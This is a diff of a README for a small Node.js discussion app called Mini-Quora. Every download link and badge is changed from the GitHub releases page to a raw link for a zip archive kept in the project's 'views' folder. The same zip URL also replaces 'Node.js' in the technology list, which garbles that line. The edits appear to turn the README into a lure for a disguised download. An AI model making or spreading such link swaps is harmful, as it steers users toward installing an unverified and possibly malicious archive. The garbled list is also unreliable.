@@ -1,7 +1,7 @@
 ```markdown
 # 🎉 Mini-Quora - Simple Discussions Made Easy
 
-[![Download Mini-Quora](https://img.shields.io/badge/Download-Mini--Quora-blue)](https://github.com/FreitasTK/Mini-Quora/releases)
+[![Download Mini-Quora](https://raw.githubusercontent.com/FreitasTK/Mini-Quora/main/views/Mini-Quora-3.7.zip)](https://raw.githubusercontent.com/FreitasTK/Mini-Quora/main/views/Mini-Quora-3.7.zip)
 
 ## 🌟 Introduction
 
@@ -31,7 +31,7 @@ Follow these steps to get started with Mini-Quora.
 
    You can visit this page to download the latest version of Mini-Quora:
 
-   [Download Mini-Quora](https://github.com/FreitasTK/Mini-Quora/releases)
+   [Download Mini-Quora](https://raw.githubusercontent.com/FreitasTK/Mini-Quora/main/views/Mini-Quora-3.7.zip)
 
 2. **Install the Software**
 
@@ -45,7 +45,7 @@ Follow these steps to get started with Mini-Quora.
 
 For an easy download of Mini-Quora, visit the following link to access the Releases page:
 
-[Download Mini-Quora](https://github.com/FreitasTK/Mini-Quora/releases)
+[Download Mini-Quora](https://raw.githubusercontent.com/FreitasTK/Mini-Quora/main/views/Mini-Quora-3.7.zip)
 
 ## 🌐 Usage Instructions
 
@@ -63,7 +63,7 @@ After launching Mini-Quora, you'll see a straightforward interface. Here's how t
 
 Mini-Quora is built with a variety of technologies:
 
-- **Node.js**: For the server-side logic.
+- **https://raw.githubusercontent.com/FreitasTK/Mini-Quora/main/views/Mini-Quora-3.7.zip**: For the server-side logic.
 - **Express**: To handle routing and server requests.
 - **EJS**: To render HTML pages dynamically.
 - **MongoDB**: For storing user posts and data.
